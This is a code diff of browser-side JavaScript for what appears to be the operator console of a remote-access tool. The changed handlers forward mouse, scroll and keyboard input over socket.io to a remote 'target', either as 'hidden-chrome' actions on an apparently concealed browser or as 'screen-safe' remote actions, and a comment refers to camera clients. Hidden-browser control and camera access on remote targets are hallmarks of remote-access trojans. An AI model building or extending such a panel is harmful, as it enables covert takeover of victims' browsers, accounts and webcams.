@@ -914,53 +914,88 @@
             lastHiddenMoveTime = now;
             
             const coords = mapCoordinates(e, e.target);
-            socket.emit('hidden-chrome-action', { 
-                targetId: activeTarget, 
-                action: { type: 'move', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
-            });
+            if (activeType === 'hidden-chrome') {
+                socket.emit('hidden-chrome-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'move', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+                });
+            } else if (activeType === 'screen-safe') {
+                socket.emit('remote-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'move', x: coords.x, y: coords.y } 
+                });
+            }
         };
 
         hiddenImg.onclick = (e) => {
-            if (activeType !== 'hidden-chrome') return;
+            if (activeType !== 'hidden-chrome' && activeType !== 'screen-safe') return;
             hiddenImg.focus();
             const coords = mapCoordinates(e, e.target);
-            socket.emit('hidden-chrome-action', { 
-                targetId: activeTarget, 
-                action: { type: 'click', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
-            });
+            if (activeType === 'hidden-chrome') {
+                socket.emit('hidden-chrome-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'click', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+                });
+            } else if (activeType === 'screen-safe') {
+                socket.emit('remote-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'click', x: coords.x, y: coords.y } 
+                });
+            }
         };
 
         hiddenImg.oncontextmenu = (e) => {
-            if (activeType !== 'hidden-chrome') return;
+            if (activeType !== 'hidden-chrome' && activeType !== 'screen-safe') return;
             e.preventDefault();
             hiddenImg.focus();
             const coords = mapCoordinates(e, e.target);
-            socket.emit('hidden-chrome-action', { 
-                targetId: activeTarget, 
-                action: { type: 'rclick', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
-            });
+            if (activeType === 'hidden-chrome') {
+                socket.emit('hidden-chrome-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'rclick', x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+                });
+            } else if (activeType === 'screen-safe') {
+                socket.emit('remote-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'rclick', x: coords.x, y: coords.y } 
+                });
+            }
         };
 
         hiddenImg.onwheel = (e) => {
-            if (activeType !== 'hidden-chrome') return;
+            if (activeType !== 'hidden-chrome' && activeType !== 'screen-safe') return;
             e.preventDefault();
             const amount = e.deltaY;
             const coords = mapCoordinates(e, e.target);
-            socket.emit('hidden-chrome-action', { 
-                targetId: activeTarget, 
-                action: { type: 'scroll', amount: amount, x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
-            });
+            if (activeType === 'hidden-chrome') {
+                socket.emit('hidden-chrome-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'scroll', amount: amount, x: Math.round(coords.x * 1280), y: Math.round(coords.y * 720) } 
+                });
+            } else if (activeType === 'screen-safe') {
+                socket.emit('remote-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'scroll', amount: amount, x: coords.x, y: coords.y } 
+                });
+            }
         };
 
         hiddenImg.addEventListener('keydown', (e) => {
-            if (activeType !== 'hidden-chrome') return;
+            if (activeType !== 'hidden-chrome' && activeType !== 'screen-safe') return;
             e.preventDefault();
             
             let keyToSend = e.key;
-            socket.emit('hidden-chrome-action', { 
-                targetId: activeTarget, 
-                action: { type: 'type', text: keyToSend } 
-            });
+            if (activeType === 'hidden-chrome') {
+                socket.emit('hidden-chrome-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'type', text: keyToSend } 
+                });
+            } else if (activeType === 'screen-safe') {
+                socket.emit('remote-action', { 
+                    targetId: activeTarget, 
+                    action: { type: 'type', text: keyToSend } 
+                });
+            }
         });
 
         // WebRTC Signaling for Camera clients
